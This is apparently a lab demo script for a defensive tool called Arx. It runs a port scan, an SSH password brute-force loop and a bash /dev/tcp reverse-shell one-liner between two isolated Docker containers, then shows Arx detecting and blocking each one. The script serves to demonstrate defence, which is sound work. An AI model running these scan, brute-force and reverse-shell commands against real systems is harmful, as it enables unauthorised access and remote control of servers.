#!/usr/bin/env bash
# Demo reproducible de Arx: tres ataques REALES contra una víctima con Arx en guardia, en
# dos contenedores aislados y efímeros. Nada se simula: las líneas de Arx son su salida
# real, filtradas al hallazgo de cada escena. Requiere Docker. Tarda ~3 min en preparar.
#
#   bash lab/demo.sh
#
set -euo pipefail
cd "$(dirname "$0")/.."
source lab/lib.sh
trap cleanup EXIT

PAUSE=${ARX_DEMO_PAUSE:-2}
ARX=(docker exec -e PYTHONPATH=/src/src -e ARX_CONFIG_DIR=/work/labcfg
     -e ARX_STATE_DIR=/work/labstate)

title()    { printf '\n\033[1;36m%s\033[0m\n' "$1"; sleep "$PAUSE"; }
note()     { printf '\033[2m%s\033[0m\n' "$1"; sleep "$PAUSE"; }
attacker() { printf '\033[31mattacker$\033[0m %s\n' "$1"; }
victim()   { printf '\033[33mvictim$\033[0m %s\n' "$1"; }
result()   { printf '\033[1m%s\033[0m\n' "$1"; sleep "$PAUSE"; }

# Un barrido real de Arx, mostrando solo el hallazgo de esta escena y su respuesta.
arx_sweep() {
  printf '\033[32marx$\033[0m arx guard --once --enforce\n'
  "${ARX[@]}" "$VIC" python3 -m arx.cli guard --once --enforce | grep -A1 -E "$1" || true
  sleep "$PAUSE"
}

# El lab comprime el tiempo: en producción esto ocurre solo a los 60 min.
fast_forward() {
  note "[lab] fast-forward 61 min: Arx undoes its own block"
  docker exec "$VIC" python3 /src/lab/driver.py release >/dev/null
}

echo "Preparing two isolated containers (victim with Arx, attacker)…"
lab_up
docker exec "$VIC" python3 /src/lab/driver.py prep >/dev/null
sleep 1
echo "=== ARX DEMO START ==="

title "Arx · three real attacks, two isolated containers."

title "1/3  Port scan"
attacker "nmap -sS -p 9000-9020 victim"
docker exec "$ATT" nmap -sS -p 9000-9020 --max-retries 1 victim | grep -E "^[0-9]+/tcp +open" | head -3
sleep "$PAUSE"
arx_sweep "scan from"
attacker "curl --max-time 4 http://victim:9001/"
if docker exec "$ATT" curl -s --max-time 4 http://victim:9001/ >/dev/null 2>&1; then
  result "reachable"
else
  result "timed out: the attacker lost all access to the server"
fi
fast_forward

title "2/3  SSH brute force"
attacker "8 wrong SSH passwords for root@victim"
docker exec "$ATT" bash -c 'for i in $(seq 8); do
  sshpass -p "wrong-$i" ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password \
    -o ConnectTimeout=3 root@victim true 2>/dev/null || true
done'
arx_sweep "authentication failures"
fast_forward

title "3/3  Reverse shell, the classic one-liner"
victim "bash -i >& /dev/tcp/attacker/4444 0>&1"
docker exec -d "$VIC" bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1"
sleep 1
attacker "(through the shell) id > /tmp/proof-1"
c2_send "id > /tmp/proof-1"
sleep 2
victim "cat /tmp/proof-1"
docker exec "$VIC" cat /tmp/proof-1
note "The attacker is running commands as root on the server."
arx_sweep "outbound connection"
attacker "(through the shell) id > /tmp/proof-2"
c2_send "id > /tmp/proof-2"
sleep 4
victim "cat /tmp/proof-2"
if docker exec "$VIC" cat /tmp/proof-2 2>/dev/null; then
  result "the command got through"
else
  result "No such file: the command never arrived"
fi

title "Every automatic action above undoes itself after 60 minutes."
printf '\033[1;36m%s\033[0m\n' "Don't trust this recording. Run it yourself: bash lab/demo.sh"
sleep "$PAUSE"
